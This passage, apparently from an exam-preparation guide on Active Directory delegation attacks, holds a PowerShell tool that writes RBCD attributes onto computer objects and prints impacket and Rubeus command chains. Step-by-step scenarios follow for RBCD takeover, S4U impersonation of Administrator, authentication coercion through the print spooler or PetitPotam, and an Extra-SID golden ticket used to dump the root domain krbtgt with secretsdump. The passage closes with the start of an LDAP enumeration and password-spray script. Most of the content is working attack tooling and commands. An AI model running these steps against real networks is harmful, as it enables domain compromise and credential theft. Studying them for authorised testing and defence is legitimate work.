    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $dn = Get-M12dComputerDn $ComputerName
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    $raw = $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Value
    Write-M12dHead "RBCD current state: $ComputerName"
    Write-Output ("  DN : " + $dn)
    if (-not $raw) {
        Write-Output "  Attribute is empty: no principal is authorized yet, which is the clean state we want to write to."
        return $dn
    }
    $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList @($raw, 0)
    Write-Output ("  DACL entry count : " + $sd.DiscretionaryAcl.Count)
    foreach ($ace in $sd.DiscretionaryAcl) {
        $who = $ace.SecurityIdentifier.Value
        try { $who = $ace.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value } catch { }
        Write-Output ("   allows {0} to act on behalf of others as {1}" -f $who, $ace.AccessMask)
    }
    return $dn
}

function Set-M12dRbcd {
    param(
        [Parameter(Mandatory = $true)][string]$ComputerName,
        [Parameter(Mandatory = $true)][string]$FakeSam
    )
    $dn = Get-M12dComputerDn $ComputerName
    $pair = Get-M12dSid $FakeSam
    $sid = $pair[0]
    Write-M12dHead "Writing RBCD: $ComputerName <- $FakeSam ($sid)"

    $sddl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
    Write-Output ("  SDDL : " + $sddl)
    $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList $sddl
    $buf = New-Object 'byte[]' $sd.BinaryLength
    $sd.GetBinaryForm($buf, 0)

    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    try {
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Clear()
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Add($buf)
        $de.CommitChanges()
        Write-Output "  [+] Write succeeded. Remember to roll back with -Mode RBCD-Rollback when the job is done."
    } catch {
        Write-Output ("  [!] Write failed : " + $_.Exception.Message)
        Write-Output "      Checks: 1) does the current identity have GenericWrite/GenericAll on $dn"
        Write-Output "            2) you wrote the full DN of the computer object, not a container (the DN is printed above)"
        Write-Output "            3) if the attribute already has a value, clear it with -Mode RBCD-Rollback first"
        return
    }

    Write-Output ""
    Write-Output "  --- attack machine (Kali) follow-up commands; replace the placeholders then run ---"
    Write-Output "  impacket-getTGT -dc-ip TARGET 'DOMAIN/$FakeSam:<fake machine password>'"
    Write-Output "  export KRB5CCNAME=$($FakeSam.TrimEnd('$')).ccache"
    Write-Output "  impacket-getST -spn 'cifs/TARGET.corp.local' -impersonate $script:ImpersonateUser \"
    Write-Output "      -dc-ip TARGET 'DOMAIN/$FakeSam:<fake machine password>'"
    Write-Output "  export KRB5CCNAME=$($script:ImpersonateUser).ccache"
    Write-Output "  impacket-wmiexec -k -no-pass DOMAIN/$script:ImpersonateUser@TARGET.corp.local"
}

function Clear-M12dRbcd {
    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $dn = Get-M12dComputerDn $ComputerName
    Write-M12dHead "Rolling back RBCD: $ComputerName"
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    try {
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Clear()
        $de.CommitChanges()
        Write-Output "  [+] Attribute cleared; the target machine is back to its un-taken-over state (an exam re-check point)."
    } catch {
        Write-Output ("  [!] Rollback failed : " + $_.Exception.Message)
        Write-Output "      Confirm the current identity has write access to the object; or inspect the state with -Mode RBCD and fix it by hand."
    }
}

# ---------------------------------------------------------------------------
# Constrained delegation: enumeration + S4U command templates
# ---------------------------------------------------------------------------
function Get-M12dConstrained {
    param([Parameter(Mandatory = $true)][string]$Account)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($script:Root)
    $s.Filter = "(sAMAccountName=$Account)"
    [void]$s.PropertiesToLoad.Add('msDS-AllowedToDelegateTo')
    [void]$s.PropertiesToLoad.Add('userAccountControl')
    [void]$s.PropertiesToLoad.Add('servicePrincipalName')
    [void]$s.PropertiesToLoad.Add('distinguishedName')
    $r = $s.FindOne()
    Write-M12dHead "Constrained delegation configuration: $Account"
    if (-not $r) { Write-Output "  Account $Account not found"; return }
    $uacRaw = 0
    if ($r.Properties.Contains('userAccountControl')) { $uacRaw = [Convert]::ToInt32($r.Properties['userAccountControl'][0]) }
    $trans = ($uacRaw -band 0x100000) -ne 0
    Write-Output ("  DN                        : " + $r.Properties['distinguishedName'][0])
    Write-Output ("  SPN                       : " + (@($r.Properties['servicePrincipalName']) -join ' | '))
    Write-Output ("  TrustedToAuthForDelegation: " + $trans + "  (True = protocol transition supported, S4U2Self does not need the impersonated user's password)")
    $targets = @($r.Properties['msDS-AllowedToDelegateTo'])
    if ($targets.Count -eq 0) { Write-Output "  msDS-AllowedToDelegateTo  : (empty, this is not a constrained delegation account)"; return }
    Write-Output "  SPNs it can delegate to:"
    foreach ($t in $targets) { Write-Output ("    - " + $t) }
    Write-Output "  Note: the delegation list contains only these SPNs; the ticket cannot be used against another machine or service class."
}

function Show-M12dS4uCommands {
    param([string]$Account, [string]$TargetSpn)
    if (-not $TargetSpn) { $TargetSpn = 'cifs/TARGET.corp.local' }
    Write-M12dHead "S4U2Self + S4U2Proxy command templates (replace the placeholders)"
    Write-Output "[A] With protocol transition (TrustedToAuthForDelegation, the common case) - no password for the impersonated user needed"
    Write-Output "  Windows (Rubeus; injects the ticket straight into memory with /ptt):"
    Write-Output ("    .\\Rubeus.exe s4u /user:$Account /password:PASS /impersonateuser:$script:ImpersonateUser \")
    Write-Output ("        /msdsspn:$TargetSpn /ptt")
    Write-Output "    .\\Rubeus.exe s4u /user:$Account /rc4:NTHASH /impersonateuser:$script:ImpersonateUser \"
    Write-Output ("        /msdsspn:$TargetSpn /ptt")
    Write-Output "  Linux (impacket):"
    Write-Output ("    impacket-getST -spn '$TargetSpn' -impersonate $script:ImpersonateUser \\")
    Write-Output ("        -dc-ip TARGET 'DOMAIN/$Account:PASS'")
    Write-Output ("    export KRB5CCNAME=$script:ImpersonateUser.ccache")
    Write-Output ("    impacket-wmiexec -k -no-pass DOMAIN/$script:ImpersonateUser@TARGET")
    Write-Output ""
    Write-Output "[B] Without protocol transition - you must hold the impersonated user's own credentials, and only S4U2Proxy works"
    Write-Output ("    impacket-getST -spn '$TargetSpn' -impersonate $script:ImpersonateUser \\")
    Write-Output ("        -hashes :NTHASH -dc-ip TARGET 'DOMAIN/$Account:PASS'")
    Write-Output "  When the DC enforces AES, add /aes256:<impersonated user's AES key> to Rubeus;"
    Write-Output "  the impersonated user's NTHASH cannot be used for S4U2Self, only for S4U2Proxy."
    Write-Output ""
    Write-Output "[C] How to validate when the delegation list only holds a service class such as http/:"
    Write-Output "    curl --negotiate -u : http://TARGET/      (SPN is http/TARGET)"
    Write-Output "    evil-winrm -i TARGET -r DOMAIN             (SPN is wsman/TARGET)"

    if ($Execute -and (Test-Path (Join-Path $script:ToolDir 'Rubeus.exe'))) {
        Write-Output ""
        Write-Output "  (-Execute was given and Rubeus.exe exists under -ToolDir)"
        Write-Output "    The script does not store passwords: fill PASS into the line below by hand and run it (the script will not run it for you)"
        Write-Output ("    & (Join-Path '$script:ToolDir' 'Rubeus.exe') s4u /user:$Account /password:PASS /impersonateuser:$script:ImpersonateUser /msdsspn:$TargetSpn /ptt")
    }
}

# ---------------------------------------------------------------------------
# Unconstrained delegation: pre-exploitation checks + monitor/trigger commands
# ---------------------------------------------------------------------------
function Get-M12dUnconstrained {
    Write-M12dHead "Unconstrained delegation pre-flight check (scenario 50)"
    $me = $env:COMPUTERNAME
    $host1 = if ($TargetComputer) { $TargetComputer } else { $me }
    Write-Output "  Host under check : $host1"

    # 1) Is this host configured for unconstrained delegation
    try {
        $dn = Get-M12dComputerDn $host1
        $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
        $uac = 0
        if ($de.Properties['userAccountControl'].Value) {
            $uac = [Convert]::ToInt32($de.Properties['userAccountControl'].Value)
        }
        if (($uac -band 0x80000) -ne 0) {
            Write-Output "  [1/4] Unconstrained delegation : yes (UAC contains 0x80000); this machine can be the landing spot"
        } else {
            Write-Output "  [1/4] Unconstrained delegation : no (UAC=$uac does not contain 0x80000) - use m12-ad-enum-windows.ps1"
            Write-Output "        -Mode Delegation to find a host that really is configured for unconstrained delegation, then come back"
        }
    } catch {
        Write-Output ("  [1/4] Failed to read the computer object : " + $_.Exception.Message)
    }

    # 2) Current identity (ticket capture needs SYSTEM)
    Write-Output "  [2/4] Identity self-check"
    Show-M12dIdentity

    # 3) Is the print spooler pipeline reachable (SpoolSample depends on it)
    Write-Output "  [3/4] Trigger vector reachability"
    $spoolPath = "\\$host1\pipe\spoolss"
    if (Test-Path $spoolPath) {
        Write-Output ("        $spoolPath reachable -> SpoolSample / printerbug is very likely to work")
    } else {
        Write-Output ("        $spoolPath unreachable -> the print service is off or patched; switch to PetitPotam (EFSRPC)/DFSCoerce")
    }

    # 4) Are the tools in place
    Write-Output "  [4/4] Tool check (-ToolDir $script:ToolDir)"
    foreach ($t in @('Rubeus.exe', 'SpoolSample.exe', 'printerbug.exe', 'PetitPotam.exe')) {
        $p = Join-Path $script:ToolDir $t
        if (Test-Path $p) { Write-Output ("        in place : " + $p) }
        else { Write-Output ("        missing  : " + $t + " (not mandatory; if it is missing, use an equivalent tool or just let monitor wait passively)") }
    }

    Write-Output ""
    Write-Output "  --- exploitation steps (two windows; with -Execute and the tools in place the script starts monitor for you) ---"
    Write-Output "  Window 1 (capture): .\\Rubeus.exe monitor /interval:5 /nowrap"
    Write-Output "  Window 2 (coerce the DC into authenticating to this host):"
    Write-Output ("         .\\SpoolSample.exe DC01 $host1   (or printerbug DC01 $host1)")
    Write-Output "  Alternative coercion: impacket-petitpotam -u USER@DOMAIN -p 'PASS' -dc-ip TARGET LHOST DC01.corp.local"
    Write-Output "  Once you have the base64 TGT for DC01\$, go back to the attack machine:"
    Write-Output "         impacket-ticketConverter dc.txt dc.ccache"
    Write-Output "         export KRB5CCNAME=dc.ccache"
    Write-Output "         impacket-secretsdump -k -no-pass DC01.corp.local"
    Write-Output "  Verify: the principal in klist should be DC01\$; if you can dump krbtgt, it is a DC machine ticket."

    if ($Execute) {
        $rubeus = Join-Path $script:ToolDir 'Rubeus.exe'
        if (Test-Path $rubeus) {
            Write-Output ""
            Write-Output "  [-Execute] Starting Rubeus monitor (Ctrl-C to stop; stop once you have the ticket)..."
            & $rubeus monitor /interval:5 /nowrap
        } else {
            Write-Output "  [-Execute] But $rubeus does not exist, so only the command is printed and nothing is run."
        }
    }
}

# ---------------------------------------------------------------------------
# Enum: see all three delegation types at once
# ---------------------------------------------------------------------------
function Get-M12dEnumAll {
    $root = $script:Root
    Write-M12dHead "Unconstrained delegation hosts (scenario 50 landing spots)"
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s.Filter = '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
    $s.PageSize = 200
    [void]$s.PropertiesToLoad.Add('sAMAccountName'); [void]$s.PropertiesToLoad.Add('dnsHostName')
    foreach ($r in $s.FindAll()) { Write-Output ("  " + $r.Properties['sAMAccountName'][0] + "  " + $r.Properties['dnsHostName'][0]) }

    Write-M12dHead "Constrained delegation accounts (scenario 52)"
    $s2 = New-Object System.DirectoryServices.DirectorySearcher
    $s2.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s2.Filter = '(msDS-AllowedToDelegateTo=*)'
    $s2.PageSize = 200
    [void]$s2.PropertiesToLoad.Add('sAMAccountName'); [void]$s2.PropertiesToLoad.Add('msDS-AllowedToDelegateTo')
    foreach ($r in $s2.FindAll()) {
        Write-Output ("  " + $r.Properties['sAMAccountName'][0] + " -> " + (@($r.Properties['msDS-AllowedToDelegateTo']) -join ', '))
    }

    Write-M12dHead "Computers with RBCD configured (scenario 51: a non-empty attribute means it has been written before)"
    $s3 = New-Object System.DirectoryServices.DirectorySearcher
    $s3.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s3.Filter = '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'
    $s3.PageSize = 200
    [void]$s3.PropertiesToLoad.Add('sAMAccountName'); [void]$s3.PropertiesToLoad.Add('distinguishedName')
    foreach ($r in $s3.FindAll()) {
        Write-Output ("  " + $r.Properties['sAMAccountName'][0])
        Write-Output ("      " + $r.Properties['distinguishedName'][0])
    }
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
function Show-M12dHelp {
    Write-Output @"

m12-delegation-attacks.ps1 - RBCD / constrained delegation / unconstrained delegation

  -Mode Enum
      list the current state of all three delegation types (no side effects)
  -Mode RBCD -TargetComputer TARGET -FakeAccount 'FAKE01$' [-ImpersonateUser Administrator]
      write the fake machine account into the target machine's msDS-AllowedToActOnBehalfOfOtherIdentity,
      and print the attack-machine follow-up commands getTGT/getST/wmiexec
  -Mode RBCD-Rollback -TargetComputer TARGET
      clear that attribute (mandatory in the exam, otherwise the target machine stays taken over)
  -Mode Constrained -ServiceAccount svc_sql [-Spn 'cifs/TARGET.corp.local']
      check the delegation target SPN and whether protocol transition is supported, print both S4U command sets (Rubeus + impacket)
  -Mode Unconstrained [-TargetComputer this host name] [-ToolDir C:\Tools] [-Execute]
      four pre-flight checks + Rubeus monitor / induced-authentication commands; -Execute starts monitor directly

  Common: -Domain DOMAIN (required when not domain-joined or when crossing domains) -ImpersonateUser USER
        -Execute (prints commands only by default; never calls the external exe)
Placeholders: DOMAIN=corp.local  TARGET=WS02  USER/PASS/NTHASH are supplied as arguments or replaced in the printed templates.
"@
}

# ---------------------------------------------------------------------------
# Main flow
# ---------------------------------------------------------------------------
if ($Help) { Show-M12dHelp; return }

try { $script:Root = Initialize-M12dRoot }
catch {
    Write-Output "[!] Initialization failed: $($_.Exception.Message)"
    exit 1
}
Write-Output "[*] Search root : $script:Root"

switch ($Mode) {
    'Enum' {
        Get-M12dEnumAll
    }
    'RBCD' {
        if (-not $TargetComputer -or -not $FakeAccount) {
            Write-Output "[!] -Mode RBCD requires -TargetComputer TARGET and -FakeAccount 'FAKE01$'"
            Write-Output "    e.g.: .\m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'"
            Show-M12dHelp
            exit 1
        }
        Get-M12dRbcd $TargetComputer | Out-Null
        Set-M12dRbcd -ComputerName $TargetComputer -FakeSam $FakeAccount
    }
    'RBCD-Rollback' {
        if (-not $TargetComputer) {
            Write-Output "[!] -Mode RBCD-Rollback requires -TargetComputer TARGET"
            exit 1
        }
        Clear-M12dRbcd $TargetComputer
    }
    'Constrained' {
        if (-not $ServiceAccount) {
            Write-Output "[!] -Mode Constrained requires -ServiceAccount <service account name> (e.g. svc_sql)"
            Write-Output "    Not sure which account is configured for constrained delegation? Run -Mode Enum first"
            exit 1
        }
        Get-M12dConstrained $ServiceAccount
        Show-M12dS4uCommands -Account $ServiceAccount -TargetSpn $Spn
    }
    'Unconstrained' {
        Get-M12dUnconstrained
    }
    'Help' { Show-M12dHelp }
}

Write-Output ""
Write-Output "[*] Tip: the high-value ticket actions (secretsdump / ticketer) all happen on the attack machine,"
Write-Output "[*]       the Windows side only captures tickets and coerces authentication; roll back RBCD and clean up tickets when done."
````

## Scenario 51: Write permissions on a computer object, but no direct admin on the target host (RBCD)

**Situation**: You have write permissions on the computer object of the target machine (say WS02) — typically GenericWrite/GenericAll, or the ability to modify `msDS-AllowedToActOnBehalfOfOtherIdentity`. You also have a "principal you can impersonate" (a machine account you create yourself is enough; the default domain policy lets ordinary users add 10). Goal: reach WS02 as an administrator.

**Assumptions**: The current user can add machine accounts to the domain (`MachineAccountQuota`>0, default 10); WS02's `msDS-AllowedToActOnBehalfOfOtherIdentity` is currently empty (never abused); the target account (Administrator) is not in Protected Users and does not have "Account is sensitive and cannot be delegated" checked.

**Prepare (attacker side)**: impacket `addcomputer / getTGT / getST / wmiexec`; on the **Windows side** the attribute-writing function is in `m12-delegation-attacks.ps1 -Mode RBCD` (writes the security descriptor with .NET ADSI, no dependency on the ActiveDirectory module).

**Procedure**:
```bash
# ① Add a fake machine (write down the password)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Fake#Passw0rd' \
  -dc-ip DC01.corp.local 'CORP/USER:PASS'
# ② Windows side: write the SID of FAKE01$ into AllowedToActOnBehalfOfOtherIdentity of WS02
#    see m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
# ③ Attacker: get a TGT for the fake machine, then impersonate Administrator and ask for a cifs/WS02 service ticket
impacket-getTGT -dc-ip DC01.corp.local 'CORP/FAKE01$:Fake#Passw0rd'
export KRB5CCNAME=FAKE01.ccache
impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
  -dc-ip DC01.corp.local 'CORP/FAKE01$:Fake#Passw0rd'
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
```
**Scripts used**: `m12-delegation-attacks.ps1` (RBCD mode: look up the SID, write the attribute, roll back).

**Validation**: `wmiexec -k` gives you a shell; `klist` shows the TGS for `cifs/WS02.corp.local` with `Administrator` as the principal.

**Failure branches and alternatives**:
- `addcomputer` returns a quota/permission error (MAQ=0) -> use an **existing service account whose password or hash you already control** (with an SPN) as the fake principal; the rest of the flow is unchanged (it must be an account you hold credentials for).
- Attribute write fails -> confirm you are writing the full DN of the WS02 computer object (not a container); clear the attribute with the rollback function in `m12-delegation-attacks.ps1` and retry; if GenericWrite does not cover that attribute, check whether the target object has a looser ACL (switch to a machine where you definitely have write permissions).
- `getST` returns a KDC error -> S4U2Self succeeded but S4U2Proxy was refused. Common causes: the target account is sensitive and cannot be delegated / the fake principal has no SPN (`addcomputer` registers `host/FAKE01` automatically, but if you create the account by hand you must add the SPN) / the ticket expired — redo step 1).
- Impersonating Administrator is refused -> impersonate a different administrator instead (for example another member of the Domain Admins group).

**Exam / OPSEC notes**: Changing the delegation attribute on WS02 is a **persistent artifact**. You must roll it back when the task is done (the script provides a rollback); otherwise the target machine is left in a taken-over state and you lose points on review. The fake machine account can be deleted afterwards (optional, but at minimum delete the ticket cache you no longer use).

---

## Scenario 52: A service account is under your control with constrained delegation, but you can only reach the listed services

**Situation**: You hold a service account configured with **constrained delegation (AllowedToDelegateTo)** (say `svc_sql`). It can impersonate any user but **only** against the SPNs the delegation lists (say `cifs/WS02` / `http/WS02`) — not against an arbitrary machine.

**Assumptions**: The service account credentials are valid; you know the delegation target SPN and host (enumerate with `m12-ad-enum-windows.ps1 -Mode Delegation`); and you distinguish the two sub-cases — ① `TrustedToAuthForDelegation` (protocol transition, S4U2Self does not need the impersonated user's password); ② no protocol transition -> you must hold the impersonated user's TGT or password (the "constrained delegation + known user credentials" scenario, supplied directly to `getST` via `-hashes`/`-aesKey`).

**Prepare (attacker side)**: `impacket-getST`; the Windows-side `Rubeus s4u` template is in `m12-delegation-attacks.ps1 -Mode Constrained`.

**Procedure**:
```bash
# Protocol transition (most common): take a TGT for svc_sql -> S4U2Self(Administrator) -> S4U2Proxy(cifs/WS02)
impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
  -dc-ip DC01.corp.local 'CORP/svc_sql:PASS'
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
# Alternative: no protocol transition -> use the impersonated user's own hash
impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
  -hashes :NTHASH -dc-ip DC01.corp.local 'CORP/svc_sql:PASS'
```
Windows-side equivalent: `Rubeus.exe s4u /user:svc_sql /password:PASS /impersonateuser:Administrator /msdsspn:cifs/WS02 /ptt` (protocol transition); without transition add `/aes256` to Rubeus (the impersonated user's hash cannot be used for S4U2Self, so you can only take the S4U2Proxy path).

**Scripts used**: `m12-delegation-attacks.ps1` (templates for the two constrained delegation sub-cases + target SPN enumeration).

**Validation**: once you have `Administrator.ccache`, `wmiexec -k` gets you into WS02; if only an HTTP SPN is allowed, validate with `curl --negotiate` or the matching WinRM tool instead of SMB.

**Failure branches and alternatives**:
- The delegation target is `cifs/WS02` but you want another service on the same host (say `http`) -> if the delegation list holds only the single entry `cifs/WS02`, you cannot change the service class; check whether `AllowedToDelegateTo` also contains `http`/`wsman`, and use `-altservice` only when the host is the same and the configuration allows multiple service classes.
- The impersonated Administrator cannot get in (sensitive and cannot be delegated) -> switch to an administrator account that can be impersonated.
- You have only the NTHASH and no cleartext password -> pass `-hashes` to `getST`; if the DC enforces AES-only you need `-aesKey` (take it from enumeration).
- The service account itself needs an SPN (S4U requires the impersonated identity to be a service account) — svc accounts usually ship with one; if it has none, add one first.

**Exam / OPSEC notes**: Constrained delegation only works against the **hosts of the listed SPNs** — do not waste time trying to use the ticket on other machines. Keep the impersonated principal and the target service as narrow as the scenario allows, and clean up the ccache as soon as you have the target so the ticket does not linger on the attacker box.

---

## Scenario 53: You own high privileges in a child domain, but the ultimate target is the forest root

**Situation**: You already control high privileges in a child domain (`child.corp.local`) — including the child krbtgt or a child DA you can dump — and the final target asset sits at the forest root (`corp.local`). **Do not assume this always works**: first determine the trust type/direction and whether SID filtering is in effect.

**Assumptions**: You need ① the trust type — an intra-forest parent/child trust (`TrustAttributes: WITHIN_FOREST`, SID filtering off by default -> the Extra SID attack works), or an external/inter-forest trust (SID filtering on by default -> Extra SID is useless); ② the direction — two-way/one-way (you only need to be able to authenticate across); ③ the child krbtgt hash (required for the Extra SID golden ticket) or the child trust key.

**Prepare (attacker side)**: enumerate trusts with `nltest`/PowerShell (script `m12-ad-enum-linux.sh -Mode Trust`); `impacket-ticketer` (to build the Extra SID golden ticket); confirm the root domain SID (`Get-DomainSID`/ldapsearch).

**Procedure**:
```bash
# ① Decide: on the child domain, check the trust attributes and both SIDs
nltest /domain_trusts /all_trusts
ldapsearch ... "(trustedDomain)" trustAttributes trustDirection     # 0x20=WITHIN_FOREST, 2=two-way
# ② Build a golden ticket with the child krbtgt and stuff in the root domain Enterprise Admins SID
impacket-ticketer -nthash <child krbtgt NT> -domain child.corp.local \
  -domain-sid <child domain SID> \
  -extra-sid 'S-1-5-21-<ROOT-DOMAIN-SID>-519' Administrator
export KRB5CCNAME=Administrator.ccache
# ③ Authenticate to root domain assets (cifs or LDAP on the root DC)
impacket-secretsdump -k -no-pass ROOTDC.corp.local
```
**Scripts used**: `m12-ad-enum-linux.sh` (trust/domain SID enumeration output); `m12-laps-and-trust-notes.md` (decision table + quick reference for the Extra SID conditions).

**Validation**: if `secretsdump -k` can dump the root domain `krbtgt` from the root DC, the Extra SID worked (you have a root domain identity). If you only get child domain content or are refused, filtering is in effect or the direction is wrong — take the failure branches.

**Failure branches and alternatives**:
- The trust is external/inter-forest (SID filtering on) -> Extra SID is useless, do not burn time: switch to cross-domain ACLs (a child DA is often granted rights on some root domain resources — enumerate the root domain ACLs for child domain principals first) or look for other reachable entry points in the root domain (re-assess LAPS/delegation/certificates).
- The one-way trust points "root -> child" (the child cannot authenticate to the root) -> neither Extra SID nor inter-realm referral tickets work; you can only use other paths inside the root domain.
- No child krbtgt but you do control the child DA -> `secretsdump` the child DC first to get krbtgt, then build the golden ticket; if you cannot get krbtgt (you only control non-DC high privileges) -> move laterally inside the child domain until you reach a DC.
- The golden ticket principal fails to authenticate in the root domain (TGS refused) -> check the root DC FQDN in `/etc/hosts` and whether the root domain SID in `-extra-sid` is correct (a missing `-519` suffix or a mistyped root domain SID are the most frequent mistakes).

**Exam / OPSEC notes**: A golden ticket is a "highest sensitivity in the domain" operation — only run it after the trust assessment confirms it (WITHIN_FOREST + a workable direction); ticketer runs locally on the attacker box and delivers no files to the target; clean up the ccache afterwards.

---

#### `m12-ad-enum-linux.sh` {#m12-ad-enum-linux-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
# Purpose: a collection of command templates for enumerating AD/LDAP from the
#       Linux (Kali) side -- ldapsearch basics/users/computers/groups/SPN/
#       delegation/LAPS/trust/SID, plus three auxiliary routes: nmap ldap
#       scripts, netexec and bloodhound-python. Every mode prints the command it
#       is about to run first, then (by default) actually runs it.
# Scenarios: M12 scenario 49 (read LAPS), 51 (RBCD prerequisite: find writable
#       computer objects), 52 (find delegation and SPNs), 53 (trust assessment +
#       domain SID). Use together with m12-laps-and-trust-notes.md.
# Dependencies: ldap-utils (ldapsearch, Kali: sudo apt install -y ldap-utils);
#       nmap (base/nmap modes); netexec (netexec mode); bloodhound-python
#       (bloodhound mode); impacket-lookupsid / python3 (sid mode, either one);
#       when a tool is missing the script does not exit silently -- it prints a
#       readable error and degrades to "print the command only".
# Usage: ./m12-ad-enum-linux.sh -m all -s DC01.corp.local -D corp.local \
#            -u USER -p 'PASS'
#       ./m12-ad-enum-linux.sh -m laps  -s DC01.corp.local -D corp.local -u USER -p 'PASS'
#       ./m12-ad-enum-linux.sh -m trust -s DC01.corp.local -D corp.local -u USER -p 'PASS'
#       ./m12-ad-enum-linux.sh -m base  -s DC01.corp.local -n      # print commands only, do not run
# Placeholders (always held in variables inside the script; substitute before
# running and never write real domain names/IPs/passwords):
#   TARGET = DC/target host IP or FQDN (passed via -s, e.g. DC01.corp.local)
#   DOMAIN = AD domain FQDN (passed via -D, e.g. corp.local; NetBIOS part via -N, e.g. CORP)
#   USER / PASS / NTHASH = bind credentials (-u / -p / -H); NTHASH works only in
#       netexec and bloodhound modes (an LDAP simple bind needs cleartext; NTHASH
#       mode warns about this automatically and degrades)
# Test status: not tested in a real domain environment; bash -n passes locally,
#       the logic is "print + execute + degrade hint"
# Differences from docs/12-ad-attacks.md:
#   1) The doc writes `-Mode Trust` (PowerShell style); Bash actually uses
#      `-m trust` -- same meaning.
#   2) The nltest in the doc's scenario 53 is a Windows command; this script's
#      trust mode implements the equivalent with ldapsearch
#      (objectClass=trustedDomain); the original nltest text is kept in
#      m12-laps-and-trust-notes.md and is not executed inside this script.
#   3) The doc does not ask for the base/nmap/netexec/bloodhound/sid modes; they
#      are added here so one command can cover cold-start enumeration of an
#      "unknown domain".
# =============================================================================
set -u

MODE="all"
DC=""            # -s  TARGET: DC host (IP or FQDN)
DOMAIN=""        # -D  DOMAIN: domain FQDN
NETBIOS=""       # -N  NetBIOS name (for binding; empty derives it from DOMAIN: corp.local -> CORP)
USER=""          # -u
PASS=""          # -p
NTHASH=""        # -H
BASEDN=""        # -b  override the default BaseDN
OUTDIR="$HOME/osep/loot/m12"
DRY=0            # -n  print commands only, do not run
PYBIN="$(command -v python3 || true)"

usage() {
    sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'

Parameters:
  -m <mode>   enumeration mode (default all):
              all         run base/users/computers/groups/spn/delegation/laps/trust in order
              base        RootDSE naming contexts + nmap ldap scripts + anonymous readability probe
              users       domain users (sAMAccountName/UPN/description/pwdLastSet)
              computers   domain computers (dnsHostName/operatingSystem/last logon)
              groups      domain groups + privileged group members (DA/EA/Schema Admins/Builtin Admins)
              spn         servicePrincipalName=* (Kerberoast candidates)
              delegation  unconstrained (UAC 524288)/constrained (msDS-AllowedToDelegateTo)/
                          RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) all three in one pass
              laps        LAPS four-attribute probe (legacy ms-Mcs-AdmPwd* + Windows LAPS
                          msLAPS-Password* / msLAPS-EncryptedPassword)
              trust       trustedDomain: trustPartner/trustAttributes/trustDirection
                          + decision table (WITHIN_FOREST=0x20 / two-way=3)
              sid         domain SID (impacket-lookupsid first, otherwise python3 decodes objectSid)
              nmap        nmap -n -sV --script "ldap* and not brute"
              netexec     three quick password-spray style probes: netexec ldap / smb / winrm
              bloodhound  bloodhound-python -c ALL (produces a zip to analyze in BloodHound locally)
  -s <host>   DC / target host (TARGET), required
  -D <fqdn>   domain FQDN (DOMAIN), required (used to derive BaseDN and bind DN)
  -N <name>   NetBIOS domain name (defaults to the first label of -D, uppercased)
  -u <user>   bind user (USER); empty means anonymous bind
  -p <pass>   cleartext password (PASS); required when -u is given
  -H <hash>   NT hash (NTHASH), only netexec / bloodhound modes support it
  -b <dn>     set BaseDN by hand (default derived from -D in the form DC=corp,DC=local)
  -o <dir>    output directory (default ~/osep/loot/m12)
  -n          print commands only, do not run (dry run; useful when writing reports/exam notes)
  -h          this help

Exit codes: 0 normal / 1 bad arguments / 2 dependency missing with no fallback
EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }

have() { command -v "$1" >/dev/null 2>&1; }

while getopts "m:s:D:N:u:p:H:b:o:nh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        D) DOMAIN="$OPTARG" ;;
        N) NETBIOS="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        b) BASEDN="$OPTARG" ;;
        o) OUTDIR="$OPTARG" ;;
        n) DRY=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# ---------- argument validation ----------
if [ -z "$DC" ] || [ -z "$DOMAIN" ]; then
    err "missing required arguments: -s <DC host> and -D <domain FQDN> must be provided (e.g. -s DC01.corp.local -D corp.local)"
    usage
fi
if [ -n "$USER" ] && [ -z "$PASS" ] && [ -z "$NTHASH" ]; then
    err "-u $USER requires either -p PASS or -H NTHASH"
    usage
fi
case "$MODE" in
    all|base|users|computers|groups|spn|delegation|laps|trust|sid|nmap|netexec|bloodhound) ;;
    *) err "unknown -m mode: ${MODE} (use -h for the list)"; exit 1 ;;
esac

